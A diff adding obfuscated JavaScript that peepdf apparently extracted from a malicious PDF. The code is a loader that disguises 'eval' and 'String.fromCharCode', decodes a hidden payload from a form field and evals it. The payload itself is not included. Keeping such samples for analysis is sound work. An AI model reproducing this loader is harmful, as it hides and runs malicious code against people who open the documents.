@@ -1,0 +1,32 @@
+// peepdf comment: Javascript code located in object 10 (version 0)
+
+var a = function() {
+        wwc = new Date(2010, 11, 4, 10);
+        var gnid = '';
+        var an = '' + wwc.getHours() + 'al';
+        an = an.replace('10', 'ev');
+        yp = app;
+        co = yp[an];
+
+        function vkcl() {
+            var wi = '',
+                pvd = [];
+            var gnid = '';
+            co('va' + gnid + 'r rgin=Str' + gnid + 'ing.f' + gnid + 'romC' + gnid + 'harCode');
+            var bn = '' + wwc.getMonth() + gnid + 'i' + gnid + 't';
+            var pqnp = 's' + bn.replace('11', 'pl');
+            var rzn = '2010';
+            rzn = '';
+            var wgm = khfdskjfh.rawValue.split(',');
+            pxof = 'le' + gnid + 'ng' + gnid + 'th';
+            var yvqk = wgm[pxof] / 2;
+            for (var ris = 0; ris < yvqk; ris++) {
+                wi += rgin(wgm[ris + yvqk] - wgm[ris]);
+            }
+            return wi;
+        }
+        var hs = vkcl();
+        co(hs);
+    };
+a.call();
+
